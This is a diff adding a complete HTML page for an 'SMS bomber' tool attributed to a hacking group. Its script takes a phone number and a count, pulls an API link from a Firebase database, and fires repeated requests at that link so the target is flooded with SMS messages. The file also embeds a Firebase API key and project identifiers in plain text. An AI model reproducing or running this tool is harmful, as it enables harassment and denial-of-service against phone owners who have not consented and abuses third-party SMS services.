@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CTM Web Bot</title>
+  <meta charset="UTF-8">
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+    }
+    .title {
+      background-color: red;
+      color: white;
+      padding: 10px;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    h1 {
+      color: #ff4c4c;
+      margin-top: 20px;
+    }
+    .created {
+      color: lime;
+    }
+    .input-box {
+      margin: 20px auto;
+      max-width: 300px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    button {
+      background: linear-gradient(to right, #3cbefc, #6fff78);
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .notification-title {
+      color: red;
+      margin-top: 30px;
+      font-size: 20px;
+      font-weight: bold;
+    }
+    .notification-box {
+      border-left: 5px solid orange;
+      margin: 10px auto;
+      max-width: 400px;
+      padding: 10px;
+      background-color: #1e1e1e;
+    }
+    footer {
+      margin-top: 50px;
+      font-size: 14px;
+    }
+    a {
+      color: #42aaff;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="title" id="main-title">Loading title...</div>
+  <h1>CTM SMS BOOMBER</h1>
+  <p class="created">Created by : MD JAHID HASAN RABBI</p>
+
+  <div class="input-box">
+    <input type="text" id="phone" placeholder="Enter Phone Number">
+    <input type="number" id="amount" placeholder="Enter Amount (Max 20)">
+    <button onclick="sendRequest()">SEND REQUEST</button>
+  </div>
+
+  <div class="notification-title">Notification</div>
+  <div class="notification-box" id="notification">Loading notification...</div>
+
+  <footer>
+    <p>
+      © 2025 Bangladesh Hacking Help Center. All rights reserved.<br>
+      Developed by <a href="#">JOIN TELEGRAM @ctmtools</a>
+    </p>
+  </footer>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyC7YYJRe4wQRCPvWlm_TPrl3kAruRQkpTY",
+      authDomain: "ctm-tools-default-rtdb.firebaseapp.com",
+      databaseURL: "https://ctm-tools-default-rtdb.firebaseio.com/",
+      projectId: "ctm-tools",
+      storageBucket: "gs://ak-game-bazar.appspot.com",
+      messagingSenderId: "631033798697",
+      appId: ":631033798697:android:35c64458863a9b8413fc38"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    db.ref("config").on("value", (snapshot) => {
+      const config = snapshot.val();
+      document.getElementById("main-title").innerText = config.title;
+      document.getElementById("notification").innerText = config.notification;
+      window.apiLink = config.api_link;
+    });
+
+    function sendRequest() {
+      const number = document.getElementById("phone").value.trim();
+      const amount = parseInt(document.getElementById("amount").value);
+      if (!number || isNaN(amount) || amount > 20 || amount < 1) {
+        alert("Please enter a valid number and amount (1-20)");
+        return;
+      }
+      const fullUrl = window.apiLink + number;
+      for (let i = 0; i < amount; i++) {
+        fetch(fullUrl).then(() => {
+          if (i === amount - 1) {
+            alert("Request sent " + amount + " times.");
+          }
+        });
+      }
+    }
+  </script>
+</body>
+</html>
